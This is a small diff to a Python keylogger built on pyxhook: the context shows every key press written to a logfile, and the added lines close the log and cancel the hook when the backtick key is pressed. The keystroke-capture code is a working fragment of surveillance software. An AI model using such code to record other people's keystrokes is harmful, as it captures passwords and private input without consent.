@@ -16,6 +16,10 @@ def OnKeyPress(event):
   else:
 	logfile.write(event.Key)
 
+  if event.Ascii==96:
+	logfile.close()
+    	new_hook.cancel()
+
 new_hook=pyxhook.HookManager()
 new_hook.KeyDown=OnKeyPress
 new_hook.HookKeyboard()
